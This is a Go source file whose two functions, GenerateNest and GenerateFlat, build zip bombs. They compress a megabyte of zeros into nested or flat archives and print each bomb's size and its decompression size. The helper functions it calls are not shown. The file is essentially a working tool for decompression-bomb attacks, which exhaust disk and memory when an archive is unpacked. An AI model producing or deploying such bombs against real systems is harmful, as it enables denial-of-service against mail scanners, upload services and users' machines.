package utils

import (
	"archive/zip"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
	"time"
)

func GenerateNest(levels int) {
	start := time.Now()
	dummyFile := "bomb/nested/dummy.txt"
	file, err := os.Create(dummyFile)
	Check(err)
	x := strings.Repeat("0", 1024*1024)
	_, err = file.Write([]byte(x))
	Check(err)
	file.Close()
	level1 := "bomb/nested/level1.zip"
	err = ZipFiles(level1, dummyFile)
	Check(err)
	decompressionSize := 1
	for i := 1; i < levels; i++ {
		decompressionSize *= 10
		zipName := fmt.Sprintf("bomb/nested/level%d.zip", i)
		err = CopyAndCompress(zipName, i)
		Check(err)
	}
	bombLevel := fmt.Sprintf("bomb/nested/level%d.zip", levels)
	bytesRead, err := ioutil.ReadFile(bombLevel)
	Check(err)
	err = ioutil.WriteFile("bomb/nested/bomb-nested.zip", bytesRead, 0755)
	Check(err)
	os.Remove(bombLevel)
	os.Remove(dummyFile)
	end := time.Now()
	elapsed := end.Sub(start)
	bombInfo, err := os.Stat("bomb/nested/bomb-nested.zip")
	Check(err)
	bombSize := bombInfo.Size()
	fmt.Println("bomb file: bomb/nested/bomb-nested.zip", bombSize/1024, "KB")
	fmt.Println("Decompression size", decompressionSize, "MB")
	fmt.Println("Total time elapsed:", elapsed, "milliseconds")
}
func GenerateFlat(count int) {
	start := time.Now()
	dummyFile := "bomb/flat/dummy.txt"
	file, err := os.Create(dummyFile)
	Check(err)
	x := strings.Repeat("0", 1024*1024)
	_, err = file.Write([]byte(x))
	Check(err)
	file.Close()
	newZipFile, err := os.Create("bomb/flat/bomb-flat.zip")
	Check(err)
	defer newZipFile.Close()
	zipWriter := zip.NewWriter(newZipFile)
	defer zipWriter.Close()
	bytesRead, err := ioutil.ReadFile(dummyFile)
	Check(err)
	for i := 1; i <= count; i++ {
		fileName := fmt.Sprintf("bomb/flat/%d.txt", i)
		err = ioutil.WriteFile(fileName, bytesRead, 0755)
		Check(err)
		err = AddFileToZip(zipWriter, fileName)
		Check(err)
		os.Remove(fileName)
	}
	os.Remove(dummyFile)
	end := time.Now()
	elapsed := end.Sub(start)
	bombInfo, err := os.Stat("bomb/flat/bomb-flat.zip")
	Check(err)
	bombSize := bombInfo.Size()
	fmt.Println("bomb file: bomb/flat/bomb-flat.zip", bombSize/1024, "KB")
	fmt.Println("Decompression size", count, "MB")
	fmt.Println("Total time elapsed:", elapsed, "milliseconds")
}
